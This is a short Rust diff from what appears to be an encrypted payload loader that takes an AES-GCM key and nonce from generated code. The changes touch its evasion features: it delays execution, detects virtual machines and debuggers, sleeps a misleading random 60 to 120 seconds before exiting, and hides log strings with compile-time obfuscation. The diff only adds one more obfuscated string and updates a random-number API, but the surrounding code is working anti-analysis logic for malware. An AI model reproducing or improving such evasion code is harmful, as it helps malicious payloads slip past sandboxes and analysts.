@@ -1,7 +1,6 @@
 mod generated;
 mod logger;
 use generated::{KEY, NONCE, DELAY_SECS, VERBOSE, VM_DETECTION};
-use std::fs;
 use std::error::Error;
 use::std::time::{Duration, Instant};
 use aes_gcm::{
@@ -66,7 +65,7 @@ fn behavior_misleading(duration_secs: u64) {
 fn delay_execution() {
     if DELAY_SECS > 0 {
         if VERBOSE {
-            logger::log_info(&format!("Delaying execution by {} seconds...", DELAY_SECS));
+            logger::log_info(&format!(obfstr!("Delaying execution by {} seconds..."), DELAY_SECS));
         }
         behavior_misleading(DELAY_SECS);
     }
@@ -81,7 +80,7 @@ fn run() -> Result<(), Box<dyn Error>> {
         if VERBOSE {
             logger::log_info(obfstr!("VM detected. Exiting..."));
         }
-        behavior_misleading(rand::thread_rng().gen_range(60..120)); // Random delay between 60 and 120 seconds
+        behavior_misleading(rand::rng().random_range(60..120)); // Random delay between 60 and 120 seconds
         return Ok(());
     }
 
@@ -89,7 +88,7 @@ fn run() -> Result<(), Box<dyn Error>> {
         if VERBOSE {
             logger::log_info(obfstr!("Debugger detected. Exiting..."));
         }
-        behavior_misleading(rand::thread_rng().gen_range(60..120)); // Random delay between 60 and 120 seconds
+        behavior_misleading(rand::rng().random_range(60..120)); // Random delay between 60 and 120 seconds
         return Ok(());
     }
 
